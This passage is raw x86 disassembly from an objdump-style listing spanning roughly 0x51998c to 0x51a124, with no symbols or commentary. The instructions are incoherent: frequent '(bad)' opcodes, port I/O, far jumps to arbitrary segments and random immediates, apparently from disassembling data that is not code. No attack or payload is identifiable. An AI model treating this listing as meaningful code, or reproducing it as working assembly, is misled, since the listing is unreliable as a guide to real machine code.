  51998c:	rol    BYTE PTR [ebx+0x44],1
  51998f:	popf   
  519990:	mov    dh,BYTE PTR [ebp-0x9937424]
  519996:	(bad)  
  519997:	daa    
  519998:	cmc    
  519999:	push   cs
  51999a:	clc    
  51999b:	cmp    eax,0x88d04d2f
  5199a0:	xchg   edx,eax
  5199a1:	or     al,0x51
  5199a3:	jb     0x519985
  5199a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5199a6:	loop   0x519992
  5199a8:	or     BYTE PTR [edx-0x29d14017],bl
  5199ae:	fcmovbe st,st(1)
  5199b0:	adc    WORD PTR [esi+0x71384d11],0x3eca
  5199b9:	xchg   esp,eax
  5199ba:	and    al,0x3e
  5199bc:	rol    dl,cl
  5199be:	in     eax,0xee
  5199c0:	push   ds
  5199c1:	add    BYTE PTR [edi+0x61],0x77
  5199c5:	lahf   
  5199c6:	aam    0x9f
  5199c8:	adc    eax,0xb228b5c1
  5199cd:	fnstsw WORD PTR [edx+edi*1+0x22e66aa4]
  5199d4:	sub    DWORD PTR [ebx-0x2b0eed53],edx
  5199da:	imul   ebx,DWORD PTR [ebx],0xc465233a
  5199e0:	clc    
  5199e1:	(bad)  
  5199e2:	mov    ebp,0x576e0ca6
  5199e7:	or     DWORD PTR [edx+0x3e],ebx
  5199ea:	nop
  5199eb:	test   DWORD PTR [ecx+0x24bc4b6],ebx
  5199f1:	test   BYTE PTR [eax],dh
  5199f3:	imul   ebx,DWORD PTR [eax],0x682ce994
  5199f9:	repnz in al,0x38
  5199fc:	sar    BYTE PTR [edi+0x5f],1
  5199ff:	mov    ds:0x85abcab3,eax
  519a04:	(bad)  
  519a05:	mov    al,BYTE PTR ds:0x646ab920
  519a0b:	xchg   esi,eax
  519a0c:	xor    ebp,DWORD PTR [ebx+0x7a]
  519a0f:	pop    ss
  519a10:	loope  0x519a10
  519a12:	dec    esi
  519a13:	retf   0xfae
  519a16:	mov    cl,0x89
  519a18:	test   al,0x1d
  519a1a:	(bad)  
  519a1b:	(bad)  
  519a1d:	shl    DWORD PTR [edx],cl
  519a1f:	fwait
  519a20:	mov    al,0x5e
  519a22:	inc    edx
  519a23:	(bad)  
  519a24:	cmp    al,0x3c
  519a26:	aam    0xb3
  519a28:	push   ebp
  519a29:	and    esi,DWORD PTR [ecx+0x4e0744c6]
  519a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519a30:	popf   
  519a31:	fwait
  519a32:	push   cs
  519a33:	call   0xd350:0xd45dfc5
  519a3a:	in     eax,0x3
  519a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519a3d:	xlat   BYTE PTR ds:[ebx]
  519a3e:	xchg   ebp,eax
  519a3f:	sbb    eax,0xcbee1353
  519a44:	push   cs
  519a45:	xchg   ebx,eax
  519a46:	rcr    DWORD PTR [edx],cl
  519a48:	sbb    edx,DWORD PTR [edi+0x379cfe36]
  519a4e:	pop    edx
  519a4f:	xor    al,0x7
  519a51:	cld    
  519a52:	sub    eax,0x3ffc4897
  519a57:	repz push ebp
  519a59:	sbb    dl,bh
  519a5b:	aam    0xa
  519a5d:	push   ss
  519a5e:	cld    
  519a5f:	out    0xee,eax
  519a61:	into   
  519a62:	lock loop 0x519a90
  519a65:	inc    edx
  519a66:	pop    eax
  519a67:	gs out 0x76,al
  519a6a:	add    BYTE PTR [ecx],al
  519a6c:	js     0x519ae2
  519a6e:	cmp    BYTE PTR [esi],bl
  519a70:	jecxz  0x519a67
  519a72:	jbe    0x519a4a
  519a74:	jb     0x519a68
  519a76:	mov    WORD PTR [edi],es
  519a78:	pop    ebx
  519a79:	ret    
  519a7a:	out    0x5c,eax
  519a7c:	mov    edi,0x2dd2f6e8
  519a81:	push   ebx
  519a82:	pop    ebx
  519a83:	jge    0x519a5d
  519a85:	jge    0x519afe
  519a87:	mov    WORD PTR [ebx+0x6a],?
  519a8a:	shr    DWORD PTR [edi-0x17],cl
  519a8d:	test   eax,0x4ecceab7
  519a92:	jl     0x519a44
  519a94:	stc    
  519a95:	enter  0x3c3f,0xd
  519a99:	push   ebx
  519a9a:	imul   esp,DWORD PTR [esi-0x5231e166],0xf71b13ae
  519aa4:	idiv   BYTE PTR [esi+ebp*8+0x11818c0f]
  519aab:	aam    0x88
  519aad:	das    
  519aae:	ror    DWORD PTR [edi+0x44],1
  519ab1:	push   0x39992952
  519ab6:	and    esi,0x4f
  519ab9:	jae    0x519aa3
  519abb:	xchg   ebx,eax
  519abc:	mov    bl,0xb0
  519abe:	clc    
  519abf:	test   eax,0xbed7099e
  519ac4:	sub    ecx,DWORD PTR [edx-0x759a16ff]
  519aca:	in     al,0x4b
  519acc:	ficomp WORD PTR [edi-0x37]
  519acf:	jg     0x519a94
  519ad1:	and    al,BYTE PTR [esi+0x7c]
  519ad4:	sahf   
  519ad5:	push   ebx
  519ad6:	add    ah,ah
  519ad8:	in     al,0x7
  519ada:	enter  0x28b6,0x17
  519ade:	stc    
  519adf:	sub    BYTE PTR [edx-0x51],bh
  519ae2:	push   ds
  519ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  519ae4:	dec    ecx
  519ae5:	pop    es
  519ae6:	ret    0x2375
  519ae9:	scas   eax,DWORD PTR es:[edi]
  519aea:	cli    
  519aeb:	in     eax,dx
  519aec:	ret    0x46bf
  519aef:	repnz out 0x38,eax
  519af2:	lds    ebx,FWORD PTR [eax+0x7e]
  519af5:	push   ds
  519af6:	push   cs
  519af7:	lahf   
  519af8:	cmp    BYTE PTR [ebp-0x1af8a177],0x9f
  519aff:	jecxz  0x519ab6
  519b01:	test   ecx,ecx
  519b03:	jecxz  0x519b20
  519b05:	pop    ebx
  519b06:	jnp    0x519b7f
  519b08:	fisttp WORD PTR [edi+0x69ce8f6d]
  519b0e:	lods   al,BYTE PTR ds:[esi]
  519b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  519b10:	(bad)  
  519b11:	cmp    DWORD PTR [edi],ebp
  519b13:	mov    esi,0x94fa42f3
  519b18:	pusha  
  519b19:	pop    edi
  519b1a:	adc    dh,BYTE PTR [ebp-0xb20e447]
  519b20:	xchg   ebp,eax
  519b21:	sbb    eax,0x99026381
  519b26:	lods   al,BYTE PTR ds:[esi]
  519b27:	xor    eax,0x4cf3297a
  519b2c:	int3   
  519b2d:	sbb    al,0xc
  519b2f:	cld    
  519b30:	out    0x67,al
  519b32:	xchg   ebp,eax
  519b33:	sbb    BYTE PTR [ecx],ah
  519b35:	pop    ds
  519b36:	jp     0x519b8b
  519b38:	push   0x4a
  519b3a:	add    BYTE PTR [edi+0x54],bl
  519b3d:	push   eax
  519b3e:	pushf  
  519b3f:	inc    ebx
  519b40:	sti    
  519b41:	ins    DWORD PTR es:[edi],dx
  519b42:	mov    ebp,0x3f242968
  519b47:	popf   
  519b48:	mov    esi,0xdab4f2ce
  519b4d:	sbb    eax,DWORD PTR [ebx+0x2c]
  519b50:	dec    ebx
  519b51:	or     eax,0x478da6ed
  519b56:	pop    eax
  519b57:	inc    edx
  519b58:	fcomp  st(0)
  519b5a:	pop    ebx
  519b5b:	(bad)  
  519b5c:	pop    ebp
  519b5d:	arpl   WORD PTR [edi+0x20565250],dx
  519b63:	mov    BYTE PTR [ebx+0x10e28a0d],cl
  519b69:	mov    bl,0x3c
  519b6b:	inc    eax
  519b6c:	fcom   st(2)
  519b6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  519b6f:	cmp    BYTE PTR [ebx],dl
  519b71:	bound  edx,QWORD PTR [edx+0x3ea6d70b]
  519b77:	(bad)  
  519b78:	(bad)  
  519b7a:	(bad)  
  519b7b:	bound  ecx,QWORD PTR ds:0x8110e78b
  519b81:	loopne 0x519b64
  519b83:	xlat   BYTE PTR ds:[ebx]
  519b84:	sti    
  519b85:	sub    BYTE PTR [ebp-0x3a0066fd],0x26
  519b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  519b8d:	push   edx
  519b8e:	sbb    cl,cl
  519b90:	or     ah,al
  519b92:	push   ss
  519b93:	ss push 0xc83a6d40
  519b99:	cmp    DWORD PTR [ebx],edi
  519b9b:	ins    DWORD PTR es:[edi],dx
  519b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  519b9d:	mov    ah,0xf
  519b9f:	mov    ecx,0x920ffa31
  519ba4:	cmp    dl,BYTE PTR [eax-0x4e09319e]
  519baa:	or     DWORD PTR [eax],edi
  519bac:	inc    esp
  519bad:	in     al,0x2e
  519baf:	addr16 cs es es into 
  519bb4:	repnz or BYTE PTR [ecx],cl
  519bb7:	dec    ebp
  519bb8:	cmp    bl,BYTE PTR [ebp-0x42]
  519bbb:	fimul  WORD PTR [ebp+0x491209f4]
  519bc1:	pop    edx
  519bc2:	xor    eax,0x39b2c328
  519bc7:	jbe    0x519c10
  519bc9:	data16 and bh,BYTE PTR [esi+ecx*4]
  519bcd:	xor    ebp,DWORD PTR ds:0xf5cea276
  519bd3:	fs icebp 
  519bd5:	mov    ds,WORD PTR [esi+0x7a]
  519bd8:	les    ebp,FWORD PTR [ebx]
  519bda:	push   edi
  519bdb:	ds push ecx
  519bdd:	pop    esp
  519bde:	or     dl,dh
  519be0:	inc    esp
  519be1:	push   esp
  519be2:	rcr    BYTE PTR [ebx+eax*1-0x7681d084],0x6b
  519bea:	and    DWORD PTR [eax],edi
  519bec:	jo     0x519bae
  519bee:	shl    BYTE PTR [ebx],0x6a
  519bf1:	add    edx,ebx
  519bf3:	fild   QWORD PTR [edi]
  519bf5:	repnz pop es
  519bf7:	dec    ecx
  519bf8:	and    ah,ah
  519bfa:	mov    esp,0x392144d6
  519bff:	inc    ecx
  519c00:	lods   al,BYTE PTR ds:[esi]
  519c01:	pop    ss
  519c02:	or     BYTE PTR [esi-0x5470c4fc],ch
  519c08:	mov    DWORD PTR [ecx-0x20],ebx
  519c0b:	sub    BYTE PTR [edi+0x3dd98959],0x5a
  519c12:	ins    DWORD PTR es:[edi],dx
  519c13:	cwde   
  519c14:	pop    ebp
  519c15:	mov    eax,ds:0x3592a81a
  519c1a:	add    DWORD PTR [ebp+eiz*8-0x686069b3],ebx
  519c21:	shl    bh,1
  519c23:	leave  
  519c24:	xchg   esp,eax
  519c25:	popf   
  519c26:	inc    edx
  519c27:	mov    ds:0xc590a229,eax
  519c2c:	dec    eax
  519c2d:	stos   DWORD PTR es:[edi],eax
  519c2e:	aaa    
  519c2f:	jmp    0x519c00
  519c31:	mov    BYTE PTR [edi+0x64c5db29],0x17
  519c38:	nop
  519c39:	mov    al,ds:0x81165f13
  519c3e:	pop    ss
  519c3f:	pop    edi
  519c40:	sahf   
  519c41:	popa   
  519c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519c43:	inc    esp
  519c44:	or     esi,ebx
  519c46:	(bad)  
  519c47:	push   esp
  519c48:	fbld   TBYTE PTR [ecx-0x51]
  519c4b:	lods   al,BYTE PTR ds:[esi]
  519c4c:	loope  0x519c21
  519c4e:	jecxz  0x519bec
  519c50:	cli    
  519c51:	and    eax,0x4818c7e1
  519c56:	push   ds
  519c57:	jge    0x519be9
  519c59:	mov    eax,ds:0xc40cd1be
  519c5e:	ffree  st(1)
  519c60:	xor    esi,DWORD PTR [edx+0x28]
  519c63:	jmp    0x519c1f
  519c65:	xchg   DWORD PTR [edx+0x285ab540],ebx
  519c6b:	mov    ds:0xa3745fc9,eax
  519c70:	cmp    eax,0xef4e98ac
  519c75:	int3   
  519c76:	mov    ss,WORD PTR [ecx-0x654571d]
  519c7c:	mov    ah,0xf1
  519c7e:	ins    BYTE PTR es:[edi],dx
  519c7f:	loope  0x519c1b
  519c81:	test   bl,ah
  519c83:	push   ebp
  519c84:	inc    ebx
  519c85:	inc    edx
  519c86:	push   ecx
  519c87:	lods   al,BYTE PTR ds:[esi]
  519c88:	or     bl,ch
  519c8a:	jno    0x519c7e
  519c8c:	in     eax,0x17
  519c8e:	retf   
  519c8f:	or     al,bh
  519c91:	mov    ds:0x4cd086,eax
  519c96:	mov    bl,0xb3
  519c98:	popa   
  519c99:	cmc    
  519c9a:	fwait
  519c9b:	loope  0x519cb3
  519c9d:	inc    esi
  519c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519c9f:	sub    ch,BYTE PTR [eax-0x4aadb973]
  519ca5:	add    al,0x63
  519ca7:	push   ecx
  519ca8:	push   ss
  519ca9:	inc    esp
  519caa:	adc    cl,BYTE PTR [ecx+0x6f]
  519cad:	pop    edi
  519cae:	jmp    0xc374:0x5d4bf600
  519cb5:	or     esi,DWORD PTR ds:0x1302ee76
  519cbb:	jge    0x519c83
  519cbd:	retf   
  519cbe:	ins    DWORD PTR es:[edi],dx
  519cbf:	pusha  
  519cc0:	jnp    0x519c4c
  519cc2:	cli    
  519cc3:	outs   dx,DWORD PTR ds:[esi]
  519cc4:	jmp    0x519d37
  519cc6:	fcom   QWORD PTR [eax+eiz*8]
  519cc9:	sti    
  519cca:	xchg   ah,ah
  519ccc:	or     bl,BYTE PTR [esp+edx*4-0x39650133]
  519cd3:	icebp  
  519cd4:	jp     0x519c77
  519cd6:	jmp    0x23c2c492
  519cdb:	mov    ds:0x67f7dfe5,eax
  519ce0:	and    eax,0xf9a708f0
  519ce5:	jae    0x519d0b
  519ce7:	sub    bh,BYTE PTR ds:0x86bde652
  519ced:	adc    esp,ecx
  519cef:	out    0x90,al
  519cf1:	push   ss
  519cf2:	fisub  DWORD PTR [edx+0x7c]
  519cf5:	sbb    dh,BYTE PTR [edx]
  519cf7:	loope  0x519d16
  519cf9:	aaa    
  519cfa:	fimul  DWORD PTR [edx+edi*8+0x13]
  519cfe:	aad    0x2f
  519d00:	dec    eax
  519d01:	in     al,dx
  519d02:	scas   al,BYTE PTR es:[edi]
  519d03:	sub    DWORD PTR [ecx-0x20513851],0x61
  519d0a:	push   edx
  519d0b:	mov    dl,0x18
  519d0d:	jge    0x519c9f
  519d0f:	mov    eax,ds:0xf815c7c4
  519d14:	jl     0x519caf
  519d16:	pop    ds
  519d17:	aaa    
  519d18:	(bad)  
  519d1c:	adc    dl,dh
  519d1e:	push   ebp
  519d1f:	push   cs
  519d20:	xlat   BYTE PTR ds:[ebx]
  519d21:	ret    0xc7b5
  519d24:	icebp  
  519d25:	test   al,0x51
  519d27:	dec    esp
  519d28:	(bad)  
  519d29:	mov    bh,0xf9
  519d2b:	loopne 0x519d1d
  519d2d:	mov    DWORD PTR [esi+edx*2-0x31],esi
  519d31:	ret    
  519d32:	scas   eax,DWORD PTR es:[edi]
  519d33:	and    dl,BYTE PTR [eax]
  519d35:	jmp    0x519d10
  519d37:	mov    esp,0x33a0d661
  519d3c:	and    eax,0xc7f0485e
  519d41:	jmp    0x29759a5d
  519d46:	mov    esp,0x95f202df
  519d4b:	out    dx,al
  519d4c:	mov    WORD PTR [ebx+0x5c],cs
  519d4f:	jge    0x519cf6
  519d51:	add    eax,0x3637ea1e
  519d56:	ja     0x519dd1
  519d58:	jecxz  0x519dbb
  519d5a:	nop    DWORD PTR ds:0xdaa63654
  519d61:	inc    esi
  519d62:	cmp    al,BYTE PTR [ecx]
  519d64:	fiadd  DWORD PTR [edx+edx*8]
  519d67:	sbb    DWORD PTR es:[ecx-0x134f9431],edx
  519d6e:	test   DWORD PTR [ecx+0x1707fe62],ecx
  519d74:	pop    esp
  519d75:	push   edi
  519d76:	outs   dx,BYTE PTR ds:[esi]
  519d77:	sub    BYTE PTR [eax+ebx*4-0x7bc5a396],bh
  519d7e:	sbb    al,0x75
  519d80:	stos   DWORD PTR es:[edi],eax
  519d81:	add    ebx,esi
  519d83:	int3   
  519d84:	jmp    0x519d50
  519d86:	push   esi
  519d87:	in     eax,0xfc
  519d89:	sub    esi,DWORD PTR [ebp-0x610ef86d]
  519d8f:	in     al,dx
  519d90:	test   BYTE PTR [edx],ah
  519d92:	xchg   BYTE PTR [edi-0x48],cl
  519d95:	cld    
  519d96:	xchg   ebx,eax
  519d97:	sbb    eax,0x9397001b
  519d9c:	shl    DWORD PTR [eax-0x45c85822],0x46
  519da3:	ds sahf 
  519da5:	cmp    bh,dh
  519da7:	mov    DWORD PTR [eax],esi
  519da9:	jno    0x519d74
  519dab:	das    
  519dac:	aaa    
  519dad:	dec    eax
  519dae:	mov    esp,0x4a56894a
  519db3:	inc    ecx
  519db4:	push   ebx
  519db5:	sub    cl,BYTE PTR [eax+esi*1+0x310c770a]
  519dbc:	push   eax
  519dbd:	jp     0x519d52
  519dbf:	pop    ss
  519dc0:	sub    al,0x28
  519dc2:	shr    DWORD PTR [ecx+0xf],0x1
  519dc6:	mov    ds:0x4984fdc0,eax
  519dcb:	mov    edx,0x16581ad2
  519dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519dd1:	jle    0x519dd8
  519dd3:	push   esi
  519dd4:	fldenv [edx-0x1d]
  519dd7:	popf   
  519dd8:	scas   eax,DWORD PTR es:[edi]
  519dd9:	clc    
  519dda:	daa    
  519ddb:	or     eax,0xe9ebfe3b
  519de0:	sbb    eax,0x9b885335
  519de5:	cmp    ecx,ebx
  519de7:	test   ch,ch
  519de9:	mov    WORD PTR [ecx-0x21],ds
  519dec:	jmp    0x519db6
  519dee:	cmp    DWORD PTR [ecx+ebx*8-0x2011f6ef],esp
  519df5:	lahf   
  519df6:	icebp  
  519df7:	popf   
  519df8:	xchg   BYTE PTR [esi-0x3],cl
  519dfb:	out    0x0,eax
  519dfd:	imul   ebp,DWORD PTR [ecx],0xffffffb8
  519e00:	sub    BYTE PTR [edi-0x37],bl
  519e03:	adc    dh,BYTE PTR [ecx-0x2b400027]
  519e09:	mov    WORD PTR [ecx],es
  519e0b:	fdivr  QWORD PTR [esi+0xf]
  519e0e:	inc    eax
  519e0f:	ficomp WORD PTR [edx-0x5a1fbba1]
  519e15:	shl    BYTE PTR [ecx+0x47c46ad4],cl
  519e1b:	pop    ebx
  519e1c:	pop    ds
  519e1d:	sti    
  519e1e:	lds    ecx,FWORD PTR [ebp-0x74f941d]
  519e24:	and    al,0x42
  519e26:	test   BYTE PTR [edi],cl
  519e28:	(bad)  
  519e29:	retf   
  519e2a:	push   esp
  519e2b:	mov    edx,DWORD PTR [ebx+edx*1]
  519e2e:	call   0x84021eb5
  519e33:	shl    cl,0x97
  519e36:	xor    al,0x26
  519e38:	jns    0x519dfd
  519e3a:	test   al,0x37
  519e3c:	sti    
  519e3d:	or     al,0x21
  519e3f:	scas   al,BYTE PTR es:[edi]
  519e40:	call   0xc041:0xf823f25e
  519e47:	inc    eax
  519e48:	xor    esp,esi
  519e4a:	mov    ah,0x76
  519e4c:	mov    bh,0x59
  519e4e:	fisttp DWORD PTR [ebx-0x5206b4f9]
  519e54:	or     eax,0xd7076217
  519e59:	add    DWORD PTR [ebp-0x257f2f4a],edx
  519e5f:	add    dl,BYTE PTR [ebp+0x79]
  519e62:	mov    eax,ds:0x3960b878
  519e67:	ins    BYTE PTR es:[edi],dx
  519e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  519e69:	into   
  519e6a:	pop    ecx
  519e6b:	fisttp DWORD PTR [eax-0x29]
  519e6e:	iret   
  519e6f:	and    esi,edx
  519e71:	sub    edx,edi
  519e73:	out    dx,al
  519e74:	mov    dl,BYTE PTR [edi+0x52c278c5]
  519e7a:	add    ch,BYTE PTR [ebx+0x65]
  519e7d:	and    eax,0x457c1f46
  519e82:	ins    DWORD PTR es:[edi],dx
  519e83:	or     al,0xc3
  519e85:	jns    0x519e87
  519e87:	cdq    
  519e88:	repz data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  519e8b:	pop    edx
  519e8c:	xor    DWORD PTR [edi+0x1ebd8746],esi
  519e92:	repz sub eax,0xfa64f678
  519e98:	gs ss pop ebp
  519e9b:	mov    eax,0xc6a58247
  519ea0:	in     al,0xec
  519ea2:	add    al,0xec
  519ea4:	ja     0x519f00
  519ea6:	xchg   BYTE PTR [esi+0x5e7ed90e],ch
  519eac:	loop   0x519e7c
  519eae:	out    dx,al
  519eaf:	xchg   esi,eax
  519eb0:	push   es
  519eb1:	into   
  519eb2:	add    cl,ch
  519eb4:	add    edi,DWORD PTR [ecx+0x53]
  519eb7:	aas    
  519eb8:	jmp    0x15ccc46
  519ebd:	jb     0x519ed3
  519ebf:	scas   al,BYTE PTR es:[edi]
  519ec0:	pxor   mm1,QWORD PTR [ebp+0x6]
  519ec4:	xchg   ecx,eax
  519ec5:	popa   
  519ec6:	stc    
  519ec7:	loop   0x519e71
  519ec9:	(bad)  
  519eca:	dec    esi
  519ecb:	mov    edx,0xcb610cb9
  519ed0:	mov    bl,0x30
  519ed2:	push   cs
  519ed3:	fist   WORD PTR [edx+0x6a60902b]
  519ed9:	aaa    
  519eda:	pop    ds
  519edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519edc:	jne    0x519ef4
  519ede:	mov    ds:0x4e966585,al
  519ee3:	mov    DWORD PTR [edi-0x440d199c],ebx
  519ee9:	aad    0x9d
  519eeb:	das    
  519eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519eed:	dec    ebp
  519eee:	fiadd  DWORD PTR gs:[esp+esi*8]
  519ef2:	pop    eax
  519ef3:	loopne 0x519eb3
  519ef5:	test   DWORD PTR [edx+0x64],esp
  519ef8:	push   ds
  519ef9:	jnp    0x519ea1
  519efb:	pushf  
  519efc:	push   es
  519efd:	sbb    eax,0x9f109eb5
  519f02:	pushf  
  519f03:	mov    ecx,0xeddb946a
  519f08:	lods   al,BYTE PTR ds:[esi]
  519f09:	mov    ds,WORD PTR [eax-0x36d195b8]
  519f0f:	dec    edi
  519f10:	lods   eax,DWORD PTR ds:[esi]
  519f11:	outs   dx,BYTE PTR ds:[esi]
  519f12:	jns    0x519ed7
  519f14:	mov    edi,DWORD PTR [edi]
  519f16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  519f17:	js     0x519ec1
  519f19:	pop    edx
  519f1a:	or     BYTE PTR [eax-0x93e939e],ch
  519f20:	pop    ss
  519f21:	mov    dl,ah
  519f23:	sahf   
  519f24:	push   ebx
  519f25:	sbb    esi,DWORD PTR [ebx+0x1f225c0a]
  519f2b:	mov    ah,0xf0
  519f2d:	and    BYTE PTR [ecx+0x40],ch
  519f30:	mov    ds:0xac5eaccf,al
  519f35:	dec    ecx
  519f36:	dec    ebp
  519f37:	fsubr  DWORD PTR [ecx-0x41]
  519f3a:	mov    WORD PTR [eax-0x3111b09e],ds
  519f40:	or     BYTE PTR [ecx],dh
  519f42:	lds    edi,FWORD PTR [esi]
  519f44:	aaa    
  519f45:	push   edx
  519f46:	leave  
  519f47:	adc    DWORD PTR [eax-0x10],ebx
  519f4a:	pushf  
  519f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519f4c:	dec    edi
  519f4d:	es jns 0x519f5c
  519f50:	mov    ebp,ebp
  519f52:	out    0x61,al
  519f54:	jge    0x519f46
  519f56:	jbe    0x519f12
  519f58:	push   edi
  519f59:	mov    eax,ds:0x98b59b16
  519f5e:	adc    DWORD PTR [edx+0x1772856c],ebx
  519f64:	daa    
  519f65:	mov    edx,0xc6f993f2
  519f6a:	cmp    esi,0xed9ca26b
  519f70:	icebp  
  519f71:	push   ds
  519f72:	jns    0x519fe9
  519f74:	push   esi
  519f75:	daa    
  519f76:	ins    BYTE PTR es:[edi],dx
  519f77:	enter  0x972e,0xa4
  519f7b:	dec    esp
  519f7c:	push   esp
  519f7d:	lahf   
  519f7e:	cmp    al,0xd8
  519f80:	sbb    eax,edx
  519f82:	jmp    0x37e3:0x9959fb0e
  519f89:	add    BYTE PTR [ebx-0x1b38c52f],0xba
  519f90:	jmp    0x519fa2
  519f92:	js     0x519fdb
  519f94:	inc    ch
  519f96:	dec    ebp
  519f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519f98:	iret   
  519f99:	iret   
  519f9a:	mov    ds:0x32997cb9,al
  519f9f:	push   edx
  519fa0:	xlat   BYTE PTR ds:[ebx]
  519fa1:	adc    DWORD PTR [edi+0x69],esp
  519fa4:	fprem1 
  519fa6:	xchg   BYTE PTR [ebx+edx*4],bh
  519fa9:	cwde   
  519faa:	mov    ebp,0xe37421af
  519faf:	sbb    BYTE PTR [ebx+eiz*2-0x25a49dc3],dh
  519fb6:	es push es
  519fb8:	pop    edx
  519fb9:	lods   eax,DWORD PTR ds:[esi]
  519fba:	sub    bl,bh
  519fbc:	dec    ebp
  519fbd:	aam    0xb6
  519fbf:	add    al,0xc8
  519fc1:	jno    0x519f7e
  519fc3:	jmp    0x978f3e32
  519fc8:	xchg   ecx,eax
  519fc9:	lahf   
  519fca:	(bad)  
  519fcb:	pop    ecx
  519fcc:	js     0x519fc3
  519fce:	dec    ecx
  519fcf:	push   edi
  519fd0:	test   al,0x2b
  519fd2:	mov    edi,0xc6e8ed15
  519fd7:	je     0x519fc6
  519fd9:	stos   DWORD PTR es:[edi],eax
  519fda:	mov    BYTE PTR [edi+0x57d97f8c],cl
  519fe0:	clc    
  519fe1:	dec    ecx
  519fe2:	add    bh,BYTE PTR [ecx+0x22e47ed]
  519fe8:	pop    ss
  519fe9:	sar    DWORD PTR [esi],1
  519feb:	push   eax
  519fec:	(bad)  
  519fed:	out    dx,al
  519fee:	lods   eax,DWORD PTR ds:[esi]
  519fef:	mov    cs,WORD PTR [eax]
  519ff1:	pusha  
  519ff2:	sub    DWORD PTR [esi+0x4d455b7d],0xc3e29c7f
  519ffc:	push   edx
  519ffd:	pop    ebp
  519ffe:	mov    eax,DWORD PTR [edi-0x2d]
  51a001:	mov    eax,0xc2b71d50
  51a006:	mov    ch,0x12
  51a008:	adc    eax,0xb503b76e
  51a00d:	sub    BYTE PTR [esp+edx*8],dl
  51a010:	and    BYTE PTR [eax-0x4c],0x44
  51a014:	jae    0x51a037
  51a016:	jmp    0xc869:0xbed94591
  51a01d:	cmp    eax,esi
  51a01f:	mov    al,ds:0xbf70cfce
  51a024:	pop    edx
  51a025:	aam    0xf2
  51a027:	addr16 mov dh,0xfd
  51a02a:	add    bh,bl
  51a02c:	and    cl,BYTE PTR [ebx+eax*2]
  51a02f:	or     eax,0x1ab42fb5
  51a034:	aaa    
  51a035:	cmp    al,0x25
  51a037:	xor    ebp,ecx
  51a039:	mov    esi,0x12210ec6
  51a03e:	inc    esp
  51a03f:	add    DWORD PTR [esi-0x67],edi
  51a042:	std    
  51a043:	stc    
  51a044:	cmc    
  51a045:	out    dx,eax
  51a046:	jbe    0x51a01a
  51a048:	ss mul DWORD PTR ss:[edi-0x45d0544a]
  51a050:	mov    dh,0x8b
  51a052:	ret    0x7124
  51a055:	mov    edi,edi
  51a057:	int    0x2a
  51a059:	icebp  
  51a05a:	bound  esi,QWORD PTR [edx+ecx*4-0x7c]
  51a05e:	int    0xb2
  51a060:	mov    eax,0x584f0a5f
  51a065:	data16 not BYTE PTR [ecx]
  51a068:	and    DWORD PTR [edi],ecx
  51a06a:	(bad)  
  51a06b:	shl    BYTE PTR [edi-0x2ee472b2],1
  51a071:	xchg   BYTE PTR [ecx+0x33],ah
  51a074:	mov    ebp,0x3969eee8
  51a079:	inc    edi
  51a07a:	mov    eax,0xc1d2d8f2
  51a07f:	imul   esi,DWORD PTR [ecx+edi*4-0x25819396],0x21d54650
  51a08a:	add    al,0x2a
  51a08c:	jecxz  0x51a015
  51a08e:	adc    ebx,DWORD PTR [edx]
  51a090:	pop    ds
  51a091:	jo     0x51a0de
  51a093:	or     edx,edx
  51a095:	sar    DWORD PTR [eax+esi*2-0x68ca3d0b],1
  51a09c:	(bad)  
  51a09d:	push   DWORD PTR [edx-0x7b]
  51a0a0:	jge    0x51a0b6
  51a0a2:	xchg   ebp,eax
  51a0a3:	mov    bl,0x1
  51a0a5:	dec    ebp
  51a0a6:	or     BYTE PTR [ecx+0x26],0x1d
  51a0aa:	stc    
  51a0ab:	and    DWORD PTR [esi+0x7d],esi
  51a0ae:	dec    ecx
  51a0af:	jmp    0x5fa5efd0
  51a0b4:	xchg   esp,eax
  51a0b5:	mov    ebp,0xafed260f
  51a0ba:	gs pextrw edx,(bad),0xc5
  51a0bd:	push   esp
  51a0be:	jae    0x51a094
  51a0c0:	out    dx,eax
  51a0c1:	jmp    0x9b1:0x9a2af5bc
  51a0c8:	pop    es
  51a0c9:	or     edi,DWORD PTR [esi]
  51a0cb:	and    edx,DWORD PTR [eax+esi*1-0x6c]
  51a0cf:	dec    eax
  51a0d0:	or     ecx,esp
  51a0d2:	add    al,0x4d
  51a0d4:	popa   
  51a0d5:	pop    esi
  51a0d6:	cmp    DWORD PTR [ebx+esi*4-0x770139e8],edi
  51a0dd:	xchg   esp,eax
  51a0de:	cmp    eax,0x8655450e
  51a0e3:	and    bh,BYTE PTR [ebp+0x5f]
  51a0e6:	fcom   QWORD PTR [eax+eiz*8]
  51a0e9:	xor    DWORD PTR [edi+eax*8+0x56263deb],edx
  51a0f0:	xchg   edx,eax
  51a0f1:	cs pop ebx
  51a0f3:	and    bh,BYTE PTR [edi-0x418dd605]
  51a0f9:	ja     0x51a116
  51a0fb:	inc    ebx
  51a0fc:	push   ss
  51a0fd:	mov    eax,ds:0x1a228f6f
  51a102:	sub    al,0x1b
  51a104:	popa   
  51a105:	mov    esp,0xe874c1d5
  51a10a:	mov    ch,0xdd
  51a10c:	shl    BYTE PTR [ecx+0x2315c746],1
  51a112:	mov    ds:0x42cf88e7,al
  51a117:	lahf   
  51a118:	add    ebx,edi
  51a11a:	jo     0x51a172
  51a11c:	push   ecx
  51a11d:	xor    eax,0x18e43bb8
  51a122:	gs pusha 
  51a124:	stos   DWORD PTR es:[edi],eax
